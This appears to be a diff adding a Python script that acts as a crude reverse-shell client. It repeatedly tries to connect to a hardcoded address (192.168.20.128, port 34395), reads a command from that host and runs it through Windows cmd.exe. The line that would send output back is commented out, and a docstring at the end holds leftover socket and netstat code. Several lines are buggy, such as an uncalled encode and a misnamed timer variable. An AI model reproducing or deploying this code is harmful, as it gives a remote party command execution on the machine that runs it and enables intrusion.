@@ -1,0 +1,105 @@
+import time
+import socket
+import subprocess
+class MySocket(socket.socket):
+   def __init__(self,*args,**kwargs):
+      socket.socket.__init__(self,*args,**kwargs)
+   def write(self,text):
+      return self.send(text.encode)
+   def readline(self):
+      return self.recv(2048).decode()
+   def flush(self):
+      return
+   def recvall(self,s):
+      data=s.recv(1)
+      s.setblocking(0)
+      starter=time.time()
+      print('loop start')
+      while time.time()-starter<2:
+         try:
+            newdata=s.recv(2048)
+            if newdata==0:
+               break
+         except socket.error:
+            pass
+         else:
+            data+=newdata
+            starttime=time.time()
+      s.setblocking(1)
+      return data.decode()
+
+def recvall(s):
+   data=s.recv(1)
+   s.setblocking(0)
+   starter=time.time()
+   print('loop start')
+   while time.time()-starter<2:
+      try:
+         newdata=s.recv(2048)
+         if newdata==0:
+            break
+      except socket.error:
+         pass
+      else:
+         data+=newdata
+         starttime=time.time()
+   s.setblocking(1)
+   return data.decode()
+
+
+def myconn(s,ports):
+   connected=False
+   while not connected:
+      for port in ports[1]:
+         try:
+            print('try port',port)
+            s.connect((ports[0],port))
+         except socket.error:
+            print('NO HELL NAH')
+            continue
+         else:
+            print('connected')
+            connected=True
+            break
+
+
+def socket1(dat):
+   s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+   myconn(s,dat)
+   time.sleep(1)
+#   t=recvall(s)
+#   print(t)
+#   fil=s.fileno()
+   cmd=recvall(s)
+   subby=subprocess.run([r'C:\Windows\System32\cmd.exe',cmd],stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
+   print(subby.stdout)
+#   s.send(subby.stdout)
+   s.close()
+
+socket1(('192.168.20.128',[34395]))
+
+
+
+
+
+
+
+
+
+
+
+'''
+   s.send(dat.encode()) 
+   subby=subprocess.run(['netstat', '-nap', '--inet'],capture_output=True)
+   print(subby.stdout.decode())
+   logk=recvall(s).split()
+   s.close()
+   print(logk)
+   an=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+   myconn(an,[int(logk[6])])
+   an.send(logk[12].encode())
+   logk=recvall(an)
+   print(logk)
+   an.close()
+   return int(logk.split()[6]),int(logk.split()[12])
+'''
